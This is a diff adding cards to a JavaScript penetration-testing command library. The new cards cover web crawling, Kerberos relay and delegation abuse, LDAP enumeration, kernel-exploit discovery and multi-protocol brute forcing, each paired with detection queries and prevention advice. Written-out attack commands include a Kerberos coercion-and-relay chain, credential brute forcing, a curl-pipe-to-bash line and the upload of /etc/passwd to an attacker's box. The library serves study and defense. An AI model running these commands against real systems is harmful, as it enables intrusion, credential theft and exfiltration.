+        "detection": "[MITRE T1595.002] Rapid HTTP requests from a single source to many endpoints; unusual User-Agent strings.",
+        "artifacts": "Web server access logs showing rapid enumeration patterns; IDS alerts for scanning activity.",
+        "splunk_spl": "index=web sourcetype=access_combined\n| stats dc(uri_path) as unique_paths, count by src_ip\n| where unique_paths > 50 AND count > 200\n| sort -count",
+        "elastic_kql": "http.request.method:(\"GET\" OR \"HEAD\") AND source.ip:*",
+        "sentinel_kql": "W3CIISLog\n| summarize RequestCount=count(), UniquePages=dcount(csUriStem) by cIP\n| where RequestCount > 200",
+        "sigma_rules": "web_httpx_scanning_activity",
+        "prevention": "Rate limiting; WAF rules to block known scanning user-agents; fail2ban for rapid request patterns.",
+        "sources": [
+          "ProjectDiscovery",
+          "https://attack.mitre.org/techniques/T1595/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "httpx web scanning activity",
+            "logic": "title: HTTP Scanning Tool Activity (httpx)\nstatus: experimental\nlogsource:\n  category: webserver\ndetection:\n  selection:\n    cs-User-Agent|contains:\n      - \"httpx\"\n      - \"projectdiscovery\"\n  condition: selection\nlevel: medium",
+            "data_source": "iis",
+            "attack": [
+              "T1595.002"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Legitimate security scanning; bug bounty programs",
+            "tuning": "Whitelist known scanner IPs; correlate with rate of requests"
+          }
+        ]
+      }
     },
     {
       "id": "cdsa-m12-yara-hunting",
@@ -67413,6 +68497,97 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "recon-katana-crawler",
+      "name": "Katana - Web Crawler & Endpoint Discovery",
+      "command": "katana -u https://<target> -d 3 -jc -kf -ef css,png,jpg,gif,svg,woff -o endpoints.txt",
+      "description": "Katana is a fast web crawler by ProjectDiscovery that discovers endpoints, JavaScript files, API routes, and form actions. It parses JavaScript for hidden endpoints, follows redirects, and supports headless browser crawling for JS-heavy sites. Critical for mapping attack surface before fuzzing.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Reconnaissance",
+      "subcategory": "Web Enumeration",
+      "certifications": [
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "ProjectDiscovery/katana; modern web recon methodology",
+      "tags": [
+        "katana",
+        "web-crawler",
+        "endpoint-discovery",
+        "javascript-parsing",
+        "projectdiscovery"
+      ],
+      "mitre": [
+        "T1595.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  go install github.com/projectdiscovery/katana/cmd/katana@latest\n\n=== BASIC CRAWL ===\n  katana -u https://target.com -d 3 -jc -kf -ef css,png,jpg -o endpoints.txt\n  # -d 3 = depth 3, -jc = JS crawling, -kf = known files\n  # -ef = extension filter (exclude static assets)\n\n=== HEADLESS MODE (for JS apps) ===\n  katana -u https://target.com -headless -d 3 -jc -o js_endpoints.txt\n\n=== EXTRACT JS ENDPOINTS ONLY ===\n  katana -u https://target.com -jc -d 2 -f qurl | grep -E \"api|graphql|endpoint\"\n\n=== CHAIN WITH HTTPX ===\n  cat alive.txt | katana -d 2 -jc -o all_endpoints.txt\n  # Or pipe into nuclei:\n  katana -u https://target.com -jc | nuclei -t cves/\n\n=== USEFUL FLAGS ===\n  -headless              # Chrome headless for JS-rendered pages\n  -automatic-form-fill   # Fill and submit forms\n  -field-scope rdn       # Restrict to root domain\n  -rate-limit 50         # Requests per second\n  -strategy breadth-first # BFS instead of DFS",
+      "examples": [
+        {
+          "label": "Crawl site with JS parsing",
+          "command": "katana -u https://target.com -d 3 -jc -kf -ef css,png,jpg,gif,svg,woff -o endpoints.txt"
+        },
+        {
+          "label": "Headless crawl for JS-heavy apps",
+          "command": "katana -u https://target.com -headless -d 3 -jc -o js_endpoints.txt"
+        },
+        {
+          "label": "Chain alive hosts into katana",
+          "command": "cat alive_hosts.txt | katana -d 2 -jc -ef css,png,jpg | sort -u > all_endpoints.txt"
+        }
+      ],
+      "references": [
+        {
+          "title": "Katana - ProjectDiscovery",
+          "url": "https://github.com/projectdiscovery/katana"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "recon-httpx-probe",
+          "note": "httpx finds alive hosts; katana crawls them for endpoints.",
+          "rel": "prereq"
+        },
+        {
+          "id": "recon-arjun-param-discovery",
+          "note": "Arjun finds hidden params on endpoints katana discovers.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Katana systematically crawls web applications to discover all accessible endpoints, JavaScript-embedded routes, and form actions that may not be visible through normal browsing.",
+        "prerequisites": "Target URL or list of URLs to crawl.",
+        "impact": "Full endpoint map of the target application, revealing hidden API routes, admin panels, and file upload endpoints.",
+        "detection": "[MITRE T1595.002] Rapid sequential HTTP requests following link patterns; unusual crawling patterns in access logs.",
+        "artifacts": "Web server logs showing systematic page traversal; high volume of requests to different paths from one source.",
+        "splunk_spl": "index=web sourcetype=access_combined\n| stats dc(uri_path) as paths, count by src_ip\n| where paths > 100\n| sort -paths",
+        "elastic_kql": "http.request.method:\"GET\" AND url.path:*",
+        "sentinel_kql": "W3CIISLog\n| summarize PathCount=dcount(csUriStem), TotalReqs=count() by cIP, bin(TimeGenerated, 5m)\n| where PathCount > 50",
+        "sigma_rules": "web_katana_crawler_activity",
+        "prevention": "Rate limiting; robots.txt enforcement; WAF crawl detection rules; authentication requirements on sensitive endpoints.",
+        "sources": [
+          "ProjectDiscovery",
+          "https://attack.mitre.org/techniques/T1595/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "Web crawler activity pattern",
+            "logic": "title: Web Crawling Tool Activity\nstatus: experimental\nlogsource:\n  category: webserver\ndetection:\n  selection:\n    cs-User-Agent|contains:\n      - \"katana\"\n      - \"crawl\"\n  condition: selection\nlevel: low",
+            "data_source": "iis",
+            "attack": [
+              "T1595.002"
+            ],
+            "fidelity": "signature",
+            "confidence": "medium",
+            "false_positives": "Search engine crawlers; SEO tools; legitimate security scanning",
+            "tuning": "Correlate with request rate; whitelist known bot user-agents"
+          }
+        ]
+      }
+    },
+    {
       "id": "cdsa-m06-kerberoasting",
       "name": "Kerberoasting - Attack, Detection & Defense",
       "command": ".\\Rubeus.exe kerberoast /outfile:spn.txt",
@@ -69806,6 +70981,109 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "ad-krbrelayx",
+      "name": "krbrelayx - Kerberos Relay & Unconstrained Delegation Abuse",
+      "command": "python3 krbrelayx.py -hashes :<hash> -t ldap://<dc_ip> --dc-ip <dc_ip> -wh attacker-wpad --delegate-access",
+      "description": "krbrelayx by dirkjanm abuses unconstrained delegation by capturing Kerberos tickets (TGTs) forwarded to compromised hosts. It includes krbrelayx.py (Kerberos relay), addspn.py (SPN manipulation), and dnstool.py (DNS record injection). Together they enable RBCD attacks, TGT extraction, and domain compromise from unconstrained delegation machines.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "Delegation Abuse",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "dirkjanm/krbrelayx; CRTP delegation module",
+      "tags": [
+        "krbrelayx",
+        "kerberos-relay",
+        "unconstrained-delegation",
+        "tgt-capture",
+        "rbcd",
+        "dirkjanm"
+      ],
+      "mitre": [
+        "T1558",
+        "T1550.003"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== THE IDEA ===\nUnconstrained delegation machines store TGTs of connecting users.\nkrbrelayx captures these TGTs in real-time via a listener.\nCombine with PrinterBug/PetitPotam to coerce DC TGTs.\n\n=== STEP 1: DNS INJECTION (if needed) ===\n  python3 dnstool.py -u <domain>\\<user> -p <pass> -a add -r attacker-wpad -d <attacker_ip> <dc_ip>\n\n=== STEP 2: ADD SPN (if needed) ===\n  python3 addspn.py -u <domain>\\<user> -p <pass> -s host/attacker-wpad <dc_ip>\n\n=== STEP 3: RUN KRBRELAYX ===\n  python3 krbrelayx.py -hashes :<machine_hash> -t ldap://<dc_ip> --dc-ip <dc_ip> --delegate-access\n  # Captures incoming TGTs and uses them for RBCD setup\n\n=== STEP 4: COERCE (trigger TGT) ===\n  python3 printerbug.py <domain>/<user>:<pass>@<dc_ip> <unconstrained_host>\n  # Or PetitPotam/DFSCoerce\n\n=== ALTERNATIVE: DUMP TICKETS ===\n  # If you have local admin on the unconstrained delegation host:\n  mimikatz# sekurlsa::tickets /export\n  Rubeus.exe monitor /interval:5 /nowrap\n  # Captures TGTs of any user connecting to the host",
+      "examples": [
+        {
+          "label": "Capture and relay Kerberos tickets",
+          "command": "python3 krbrelayx.py -hashes :aad3b435b51404eeaad3b435b51404ee -t ldap://dc01.corp.local --dc-ip 192.168.1.10 --delegate-access"
+        },
+        {
+          "label": "Inject DNS record for WPAD",
+          "command": "python3 dnstool.py -u corp.local\\jdoe -p Password123 -a add -r attacker-wpad -d 192.168.1.50 192.168.1.10"
+        },
+        {
+          "label": "Add SPN for Kerberos capture",
+          "command": "python3 addspn.py -u corp.local\\jdoe -p Password123 -s host/attacker-wpad 192.168.1.10"
+        }
+      ],
+      "references": [
+        {
+          "title": "krbrelayx - dirkjanm",
+          "url": "https://github.com/dirkjanm/krbrelayx"
+        },
+        {
+          "title": "dirkjanm blog - Kerberos delegation",
+          "url": "https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-dfscoerce",
+          "note": "DFSCoerce triggers DC authentication; krbrelayx captures the TGT.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ad-shadowcoerce",
+          "note": "Another coercion method to trigger TGT forwarding.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Unconstrained delegation causes the connecting client to forward their TGT to the server. krbrelayx captures these TGTs in transit and can relay them for RBCD attacks or use them directly for impersonation.",
+        "prerequisites": "Control of a host with unconstrained delegation (or ability to set RBCD); coercion method to trigger authentication.",
+        "impact": "Domain admin compromise by capturing DC machine account TGT and using it for DCSync or RBCD.",
+        "detection": "[MITRE T1558] TGT delegation events; unusual Kerberos ticket requests; DNS record modifications.",
+        "artifacts": "Event 4768 (TGT request) from unexpected sources; DNS zone modifications; Kerberos delegation audit events.",
+        "splunk_spl": "index=windows EventCode=4768\n| where TargetUserName=\"*$\" AND ServiceName!=\"krbtgt\"\n| table _time, TargetUserName, IpAddress, ServiceName",
+        "elastic_kql": "event.code:\"4768\" AND user.name:*$ AND NOT service.name:\"krbtgt\"",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4768\n| where TargetUserName endswith \"$\"\n| project TimeGenerated, TargetUserName, IpAddress, ServiceName",
+        "sigma_rules": "win_security_kerberos_relay_tgt_capture",
+        "prevention": "Remove unnecessary unconstrained delegation; use constrained delegation or RBCD instead; protect tier-0 assets; monitor for DNS record injection.",
+        "sources": [
+          "CRTP delegation module",
+          "https://attack.mitre.org/techniques/T1558/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Kerberos TGT capture via unconstrained delegation",
+            "logic": "SecurityEvent\n| where EventID == 4624 and LogonType == 3\n| where TargetUserName endswith \"$\" and AuthenticationPackageName == \"Kerberos\"\n| join kind=inner (\n    SecurityEvent | where EventID == 4768 | project TGTTime=TimeGenerated, TGTUser=TargetUserName, TGTSource=IpAddress\n) on $left.TargetUserName == $right.TGTUser\n| where abs(datetime_diff(\"second\", TimeGenerated, TGTTime)) < 30",
+            "data_source": "windows-security",
+            "log_ids": [
+              "4624",
+              "4768"
+            ],
+            "attack": [
+              "T1558",
+              "T1550.003"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate unconstrained delegation services",
+            "tuning": "Alert on DC machine accounts connecting to non-DC servers; baseline delegation patterns"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -72152,6 +73430,99 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Reads the password policy over raw LDAP:\n  ldapsearch -h <dc_ip>   the DC\n  -x                      simple (anonymous or basic) authentication\n  -b \"<base_dn>\"          search base (the domain DN)\n  -s sub \"*\"              subtree scope, all attributes\n  | grep -A 20 pwdHistoryLength   pull the policy attributes out\nGets lockout threshold, history, and complexity so you can plan spraying; add -D/-W for an authenticated bind."
+    },
+    {
+      "id": "ad-ldeep",
+      "name": "ldeep - LDAP Enumeration from Linux",
+      "command": "ldeep ldap -u <user> -p <pass> -d <domain> -s ldap://<dc_ip> all ldeep_output/",
+      "description": "ldeep is a Python tool for in-depth LDAP enumeration from Linux. It extracts users, groups, computers, GPOs, trusts, delegations, ADCS templates, LAPS passwords, gMSA passwords, and more. Unlike ldapsearch, ldeep structures output and knows what to look for in an AD context. Complementary to BloodHound for manual deep-dive enumeration.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Active Directory",
+      "subcategory": "Enumeration",
+      "certifications": [
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "franc-music-studio/ldeep; CPTS AD enumeration",
+      "tags": [
+        "ldeep",
+        "ldap",
+        "ad-enumeration",
+        "linux",
+        "delegation",
+        "gpo",
+        "trusts"
+      ],
+      "mitre": [
+        "T1087.002",
+        "T1069.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  pip3 install ldeep\n\n=== DUMP EVERYTHING ===\n  ldeep ldap -u <user> -p <pass> -d <domain> -s ldap://<dc_ip> all ldeep_output/\n  # Creates structured files: users.json, computers.json, groups.json, etc.\n\n=== SPECIFIC QUERIES ===\n  ldeep ldap -u <user> -p <pass> -d <domain> -s ldap://<dc_ip> users        # All users\n  ldeep ldap ... delegations    # Unconstrained/constrained delegation\n  ldeep ldap ... trusts         # Domain trusts\n  ldeep ldap ... gmsa           # gMSA passwords (if readable)\n  ldeep ldap ... pso            # Password policies (fine-grained)\n  ldeep ldap ... silo           # Auth silos/policies\n  ldeep ldap ... shadow_creds   # Shadow credentials config\n  ldeep ldap ... pkis           # ADCS templates and CAs\n  ldeep ldap ... sccm           # SCCM configuration\n\n=== KERBEROS AUTH ===\n  export KRB5CCNAME=ticket.ccache\n  ldeep ldap -k -d <domain> -s ldap://<dc_ip> users\n\n=== OUTPUT FORMATS ===\n  ldeep ldap ... users -o json  # JSON output\n  ldeep ldap ... users -o csv   # CSV for spreadsheets",
+      "examples": [
+        {
+          "label": "Dump all AD data",
+          "command": "ldeep ldap -u jdoe -p Password123 -d corp.local -s ldap://192.168.1.10 all ldeep_output/"
+        },
+        {
+          "label": "Find delegation paths",
+          "command": "ldeep ldap -u jdoe -p Password123 -d corp.local -s ldap://192.168.1.10 delegations"
+        },
+        {
+          "label": "Enumerate ADCS templates",
+          "command": "ldeep ldap -u jdoe -p Password123 -d corp.local -s ldap://192.168.1.10 pkis"
+        }
+      ],
+      "references": [
+        {
+          "title": "ldeep - GitHub",
+          "url": "https://github.com/franc-music-studio/ldeep"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-adpeas",
+          "note": "adPEAS is Windows PowerShell; ldeep is Linux Python. Both enumerate AD.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "ldeep performs authenticated LDAP queries to enumerate AD objects. Standard domain user credentials provide read access to most AD attributes by default.",
+        "prerequisites": "Valid domain credentials; network access to LDAP (TCP 389/636).",
+        "impact": "Complete AD enumeration revealing users, groups, trusts, delegation, ADCS, and other escalation paths.",
+        "detection": "[MITRE T1087.002] High-volume LDAP queries; enumeration of sensitive attributes (ms-Mcs-AdmPwd, msDS-GroupMSAMembership).",
+        "artifacts": "LDAP query logs (Event 1644 if enabled); network traffic to DC port 389/636.",
+        "splunk_spl": "index=windows EventCode=1644\n| stats count by SearchFilter, ClientIP\n| where count > 50\n| sort -count",
+        "elastic_kql": "event.code:\"1644\" AND winlog.event_data.SearchFilter:*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 1644\n| summarize QueryCount=count() by ClientIP=extract(@\"Client: (\\S+)\", 1, EventData)\n| where QueryCount > 50",
+        "sigma_rules": "win_ldap_enumeration_high_volume",
+        "prevention": "Enable LDAP query logging (Event 1644); restrict access to sensitive attributes; implement LDAP signing and channel binding.",
+        "sources": [
+          "CPTS methodology",
+          "https://attack.mitre.org/techniques/T1087/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "High-volume LDAP enumeration",
+            "logic": "SecurityEvent\n| where EventID == 1644\n| summarize QueryCount=count(), DistinctFilters=dcount(EventData) by ClientIP=extract(@\"Client: (\\S+)\", 1, EventData), bin(TimeGenerated, 5m)\n| where QueryCount > 100 or DistinctFilters > 20",
+            "data_source": "windows-security",
+            "log_ids": [
+              "1644"
+            ],
+            "attack": [
+              "T1087.002",
+              "T1069.002"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "SCCM, SCOM, or other management tools querying AD; BloodHound collection",
+            "tuning": "Baseline normal LDAP query volumes; whitelist known management tool IPs"
+          }
+        ]
+      }
     },
     {
       "type": "command",
@@ -77683,6 +79054,103 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Exfiltrates a file to your attack box over an encrypted HTTPS uploadserver:\n  curl -X POST https://<ip>/upload   POST to the uploadserver's upload endpoint\n  -F 'files=@/etc/passwd'            attach the file as multipart form data\n  --insecure                         accept the self-signed cert\nUploads the file over TLS so creds are not sent in cleartext; run 'python3 -m uploadserver 443 --server-certificate' on your side first."
+    },
+    {
+      "id": "linux-exploit-suggester",
+      "name": "Linux Exploit Suggester - Kernel Exploit Finder",
+      "command": "bash les.sh --checksec",
+      "description": "Linux Exploit Suggester (LES) checks the kernel version and security features against a database of known kernel exploits. It identifies missing protections (SMEP, SMAP, KASLR) and suggests specific CVEs and exploit code. The --checksec flag also audits security hardening. Essential for Linux privilege escalation enumeration.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Post-Exploitation",
+      "subcategory": "Privilege Escalation",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "mzet-/linux-exploit-suggester; OSCP Linux privesc",
+      "tags": [
+        "linux-exploit-suggester",
+        "les",
+        "kernel-exploit",
+        "linux-privesc",
+        "cve",
+        "checksec"
+      ],
+      "mitre": [
+        "T1068"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== DOWNLOAD & RUN ===\n  # On attacker:\n  wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh\n  # Transfer to target, then:\n  bash les.sh\n\n=== WITH SECURITY CHECK ===\n  bash les.sh --checksec\n  # Checks: ASLR, SMEP, SMAP, kernel hardening, etc.\n\n=== SPECIFY KERNEL VERSION ===\n  bash les.sh --uname \"4.15.0-20-generic\"\n\n=== COMMON KERNEL EXPLOITS ===\n- DirtyPipe (CVE-2022-0847) - kernel 5.8-5.16\n- DirtyCow (CVE-2016-5195) - kernel 2.x-4.x\n- PwnKit (CVE-2021-4034) - polkit pkexec (not kernel)\n- GameOver(lay) (CVE-2023-2640) - Ubuntu overlayfs\n- Baron Samedit (CVE-2021-3156) - sudo heap overflow\n\n=== ALTERNATIVE: linpeas ===\nlinPEAS is broader (checks misconfigs, creds, SUID, etc.)\nbut LES is faster and more focused for kernel exploits.",
+      "examples": [
+        {
+          "label": "Run with security checks",
+          "command": "bash les.sh --checksec"
+        },
+        {
+          "label": "Check specific kernel version",
+          "command": "bash les.sh --uname \"5.4.0-42-generic\""
+        },
+        {
+          "label": "Download and run in one line",
+          "command": "curl -sL https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash"
+        }
+      ],
+      "references": [
+        {
+          "title": "Linux Exploit Suggester - GitHub",
+          "url": "https://github.com/mzet-/linux-exploit-suggester"
+        },
+        {
+          "title": "MITRE T1068 - Exploitation for Privilege Escalation",
+          "url": "https://attack.mitre.org/techniques/T1068/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "dirty-pipe",
+          "note": "DirtyPipe is one of the top exploits LES identifies.",
+          "rel": "next"
+        },
+        {
+          "id": "linux-wildcard-injection",
+          "note": "Non-kernel privesc alternative if LES finds nothing.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Compares the running kernel version against a curated database of kernel CVEs with known public exploits, identifying which vulnerabilities affect the exact kernel build.",
+        "prerequisites": "Shell access on the target Linux system.",
+        "impact": "Identifies kernel exploits that grant root access on unpatched systems.",
+        "detection": "[MITRE T1068] Execution of kernel exploit binaries; suspicious process creation with root context changes.",
+        "artifacts": "Bash history showing les.sh execution; kernel exploit compilation artifacts; unexpected root shells.",
+        "splunk_spl": "index=linux sourcetype=syslog process_name IN (\"gcc\", \"make\", \"exploit\", \"dirty*\")\n| table _time, host, user, process_name, process",
+        "elastic_kql": "process.name:(\"gcc\" OR \"make\" OR \"exploit*\" OR \"dirty*\")",
+        "sentinel_kql": "Syslog\n| where ProcessName in (\"gcc\", \"make\") or ProcessName contains \"exploit\"\n| project TimeGenerated, HostName, ProcessName, SyslogMessage",
+        "sigma_rules": "linux_kernel_exploit_compilation",
+        "prevention": "Regular kernel updates; enable SMEP/SMAP/KASLR; use grsecurity/PaX if available; restrict compiler access on production systems.",
+        "sources": [
+          "OSCP methodology",
+          "https://attack.mitre.org/techniques/T1068/"
+        ],
+        "detections": [
+          {
+            "platform": "sigma",
+            "name": "Linux kernel exploit compilation on target",
+            "logic": "title: Suspicious Compilation on Production System\nstatus: experimental\nlogsource:\n  product: linux\n  category: process_creation\ndetection:\n  selection:\n    Image|endswith:\n      - \"/gcc\"\n      - \"/cc\"\n      - \"/make\"\n    User|re: \"^(?!root$)\"\n  condition: selection\nlevel: high",
+            "data_source": "linux-audit",
+            "attack": [
+              "T1068"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Development environments; CI/CD build servers",
+            "tuning": "Exclude development machines; alert on production/DMZ systems only"
+          }
+        ]
+      }
     },
     {
       "id": "passwd-write-lpe",
@@ -105342,6 +106810,82 @@ const COMMAND_DATA = {
       "explain": "Reference index of the OWASP API Security Top 10 (2023).\nFor each risk: the one-line test approach and the card in this library that exploits it."
     },
     {
+      "id": "recon-paramspider",
+      "name": "ParamSpider - URL Parameter Discovery from Archives",
+      "command": "python3 paramspider.py -d <target_domain> -o params.txt",
+      "description": "ParamSpider mines the Wayback Machine (web.archive.org) for historical URLs containing parameters. It extracts unique parameter names from archived URLs, revealing hidden or deprecated endpoints that may still be vulnerable. Combine with DalFox for XSS or SQLMap for injection testing.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Reconnaissance",
+      "subcategory": "Parameter Discovery",
+      "certifications": [
+        "CPTS"
+      ],
+      "primary_cert": "CPTS",
+      "source": "devanshbatham/ParamSpider; web recon methodology",
+      "tags": [
+        "paramspider",
+        "parameter-discovery",
+        "wayback-machine",
+        "web-archive",
+        "passive-recon"
+      ],
+      "mitre": [
+        "T1596"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  git clone https://github.com/devanshbatham/ParamSpider\n  cd ParamSpider\n  pip3 install -r requirements.txt\n\n=== BASIC USE ===\n  python3 paramspider.py -d target.com -o params.txt\n\n=== EXCLUDE STATIC FILES ===\n  python3 paramspider.py -d target.com --exclude woff,css,js,png,jpg,gif,svg -o params.txt\n\n=== CHAIN WITH TESTING TOOLS ===\n  # XSS testing:\n  cat params.txt | dalfox pipe\n  # SQL injection:\n  cat params.txt | while read url; do sqlmap -u \"$url\" --batch; done\n  # Or with gf (grep filters):\n  cat params.txt | gf sqli | sqlmap --batch --level 3\n\n=== COMBINE WITH ARJUN ===\nParamSpider finds historically KNOWN params from archives.\nArjun brute forces for CURRENT hidden params.\nUse both for maximum coverage.",
+      "examples": [
+        {
+          "label": "Mine archived URLs for parameters",
+          "command": "python3 paramspider.py -d target.com -o params.txt"
+        },
+        {
+          "label": "Chain with DalFox for XSS",
+          "command": "python3 paramspider.py -d target.com -o params.txt && cat params.txt | dalfox pipe"
+        },
+        {
+          "label": "Exclude static file extensions",
+          "command": "python3 paramspider.py -d target.com --exclude woff,css,js,png,jpg,gif,svg -o params.txt"
+        }
+      ],
+      "references": [
+        {
+          "title": "ParamSpider - GitHub",
+          "url": "https://github.com/devanshbatham/ParamSpider"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "recon-arjun-param-discovery",
+          "note": "Arjun actively brute forces params; ParamSpider passively mines archives.",
+          "rel": "alternative"
+        },
+        {
+          "id": "web-dalfox-xss",
+          "note": "Test discovered parameters for XSS with DalFox.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Queries the Wayback Machine API for all archived URLs of the target domain, extracting unique parameters. Deprecated endpoints may still be accessible and lack modern security controls.",
+        "prerequisites": "Target domain name; internet access to web.archive.org.",
+        "impact": "Discovers hidden endpoints and parameters that may be vulnerable to injection attacks.",
+        "detection": "[MITRE T1596] Passive - queries Wayback Machine, not the target. No target-side detection possible for the discovery phase.",
+        "artifacts": "No target-side artifacts from ParamSpider itself; subsequent testing generates web server logs.",
+        "splunk_spl": "| Comment(\"Passive archive mining - detect subsequent active testing of discovered params\")",
+        "elastic_kql": "(No target-side detection for archive mining)",
+        "sentinel_kql": "// Passive recon via Wayback Machine generates no target logs.\n// Monitor for subsequent testing of discovered parameters.",
+        "sigma_rules": "N/A - passive reconnaissance",
+        "prevention": "Remove deprecated endpoints; validate all parameters regardless of age; WAF rules for injection patterns.",
+        "sources": [
+          "Web recon methodology",
+          "https://attack.mitre.org/techniques/T1596/"
+        ]
+      }
+    },
+    {
       "id": "pth-smbclient",
       "name": "Pass-the-Hash with smbclient",
       "command": "smbclient \\\\\\\\<target>\\\\<share> -U <domain>/<user> --pw-nt-hash <nt_hash>",
@@ -105753,6 +107297,95 @@ const COMMAND_DATA = {
             "confidence": "high",
             "false_positives": "Legitimate smart card or certificate-based LDAP authentication",
             "tuning": "Alert when Schannel logon is followed by privileged group modification within 5 minutes"
+          }
+        ]
+      }
+    },
+    {
+      "id": "crack-patator",
+      "name": "Patator - Multi-Protocol Brute Forcer",
+      "command": "patator ssh_login host=<target> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg=\"Authentication failed\"",
+      "description": "Patator is a modular multi-protocol brute forcer supporting SSH, FTP, HTTP, SMB, LDAP, VNC, SNMP, and more. It offers granular response filtering (by status, content, size), threading control, and resume capability. More flexible than Hydra for complex authentication schemes and custom response handling.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Password Attacks",
+      "subcategory": "Brute Force",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "lanjelot/patator; OSCP password attack methodology",
+      "tags": [
+        "patator",
+        "brute-force",
+        "password-spray",
+        "ssh",
+        "http",
+        "multi-protocol"
+      ],
+      "mitre": [
+        "T1110.001",
+        "T1110.003"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== SSH BRUTE FORCE ===\n  patator ssh_login host=<target> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg=\"Authentication failed\"\n\n=== HTTP POST LOGIN ===\n  patator http_fuzz url=\"http://<target>/login\" method=POST body=\"user=FILE0&pass=FILE1\" 0=users.txt 1=passwords.txt -x ignore:fgrep=\"Invalid\"\n\n=== HTTP BASIC AUTH ===\n  patator http_fuzz url=\"http://<target>/admin\" user_pass=FILE0:FILE1 0=users.txt 1=passwords.txt -x ignore:code=401\n\n=== FTP ===\n  patator ftp_login host=<target> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg=\"Login incorrect\"\n\n=== SMB ===\n  patator smb_login host=<target> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:fgrep=\"STATUS_LOGON_FAILURE\"\n\n=== SNMP COMMUNITY STRINGS ===\n  patator snmp_login host=<target> community=FILE0 0=communities.txt -x ignore:mesg=\"error\"\n\n=== RESPONSE FILTERING ===\n  -x ignore:code=401          # Ignore HTTP 401\n  -x ignore:fgrep=\"Invalid\"   # Ignore responses containing text\n  -x ignore:size=1234          # Ignore by response size\n  -x quit:code=302             # Stop on redirect (success)",
+      "examples": [
+        {
+          "label": "SSH brute force",
+          "command": "patator ssh_login host=192.168.1.10 user=FILE0 password=FILE1 0=users.txt 1=passwords.txt -x ignore:mesg=\"Authentication failed\""
+        },
+        {
+          "label": "HTTP POST form login",
+          "command": "patator http_fuzz url=\"http://target.com/login\" method=POST body=\"user=FILE0&pass=FILE1\" 0=users.txt 1=passwords.txt -x ignore:fgrep=\"Invalid\""
+        },
+        {
+          "label": "SNMP community string brute force",
+          "command": "patator snmp_login host=192.168.1.10 community=FILE0 0=/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt -x ignore:mesg=\"error\""
+        }
+      ],
+      "references": [
+        {
+          "title": "Patator - GitHub",
+          "url": "https://github.com/lanjelot/patator"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-kerbrute-userenum",
+          "note": "Kerbrute for AD user enumeration; Patator for protocol-level brute force.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Patator systematically tries credential combinations against network services. Its modular architecture supports many protocols and its filtering system identifies successful logins efficiently.",
+        "prerequisites": "Network access to the target service; username and password lists.",
+        "impact": "Compromise of service accounts; initial foothold through brute-forced credentials.",
+        "detection": "[MITRE T1110] Multiple failed authentication attempts from a single source; account lockout events.",
+        "artifacts": "Authentication failure logs (SSH auth.log, Windows 4625, web access logs); account lockout events (4740).",
